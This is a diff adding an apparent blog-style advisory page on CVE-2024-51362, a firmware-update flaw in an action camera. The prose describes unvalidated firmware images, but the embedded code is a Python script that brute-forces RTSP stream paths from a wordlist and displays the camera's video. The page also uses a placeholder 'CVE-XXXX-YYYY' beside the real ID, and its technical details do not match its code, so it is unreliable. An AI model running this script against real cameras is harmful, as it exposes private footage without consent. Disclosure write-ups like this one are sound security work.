@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Detailed report on CVE discovered in an action camera">
+    <title>CVE-2024-51362</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <header>
+        <h1>CVE-2024-51362</h1>
+    </header>
+    
+    <section>
+        <h2>Introduction</h2>
+        <p>
+            Welcome to our latest blog post! In this article, we will discuss a critical vulnerability discovered in a popular action camera. This vulnerability has been assigned the Common Vulnerabilities and Exposures (CVE) identifier <strong>CVE-2024-51362</strong>.
+        </p>
+    </section>
+
+    <section>
+        <h2>Overview of the Vulnerability</h2>
+        <p>
+            In this article, we dive into the details of a newly discovered vulnerability in an action camera, identified as <strong>CVE-XXXX-YYYY</strong>. This vulnerability impacts the device's firmware, potentially allowing unauthorized access and remote code execution.
+        </p>
+    </section>
+
+    <section>
+        <h2>Technical Details</h2>
+        <p>
+            The vulnerability lies in the camera's firmware update mechanism, which fails to validate the integrity of downloaded firmware images. This makes it possible for attackers to intercept the update process and inject malicious code.
+        </p>
+        <pre>
+// bruteforce script for the RTSP protocol running on port xxxx 
+
+import cv2
+import argparse
+import socket
+import time
+
+def bf(ip_address, port, file):
+    # RTSP-stream URL
+    rtsp_ip = f"{ip_address}:{port}"
+
+    try:
+        # Attempt to create a socket connection with a timeout
+        print("Attempting to connect...")
+        socket.create_connection((ip_address, port), timeout=5)
+        print("Connection successful!")
+    except socket.timeout:
+        # If a timeout occurs, print a countdown
+        for remaining_time in range(5, 0, -1):
+            print(f"Time out in {remaining_time}")
+            time.sleep(1)
+        print("Timed out")
+        exit()
+
+    # Make a VideoCapture object to connect to the RTSP-stream
+    with open(file, 'r') as directories:
+        for directory in directories:
+            directory = directory.strip()
+
+            cap = cv2.VideoCapture(f"rtsp://{rtsp_ip}+{directory}")
+
+            # Check if the connection is opened
+            if cap.isOpened():
+                print(f"Connection successful with directory: {directory}")
+                break
+            print(f"Connection failed with directory: {directory}")
+            continue
+
+    # Loop to capture frames
+    while True:
+        ret, frame = cap.read()
+
+        # Check if the frame is successfully captured
+        if not ret:
+            print("Cannot capture frame.")
+            break
+
+        # Further processing of the frame can be done here (e.g., display)
+        cv2.imshow("RTSP Stream", frame)
+
+        # Press 'q' to exit the loop
+        if cv2.waitKey(1) & 0xFF == ord('q'):
+            break
+
+    # Close the connection and windows
+    cap.release()
+    cv2.destroyAllWindows()
+    
+
+def main():
+    parser = argparse.ArgumentParser(description="Real Time Streaming Protocol (RTSP) Bruteforce")
+    parser.add_argument("-ip", "--ip_address", type=str, required=True, help="the IP address")
+    parser.add_argument("-p", "--port", type=int, required=True, help="the port")
+    parser.add_argument("-f", "--file", type=str, required=True, help="path to file")
+    args = parser.parse_args()
+
+    bf(args.ip_address, args.port, args.file)
+
+if __name__ == "__main__":
+    main()
+        </pre>
+    </section>
+
+    <section>
+        <h2>Impact</h2>
+        <p>
+            If exploited, this vulnerability could allow attackers to gain complete control over the device, access sensitive footage, or even use the camera as a foothold in a broader network attack.
+        </p>
+    </section>
+
+    <section>
+        <h2>Mitigation Steps</h2>
+        <p>
+            Users are advised to avoid connecting the camera to untrusted networks and to apply firmware updates from the manufacturer's official website. Developers are urged to implement secure firmware update mechanisms, such as digital signature verification.
+        </p>
+    </section>
+
+    <footer>
+        <p>Written by: Patrick Kuin and Twan Terstappen</p>
+        <p>&copy; 2024</p>
+    </footer>
+</body>
+</html>
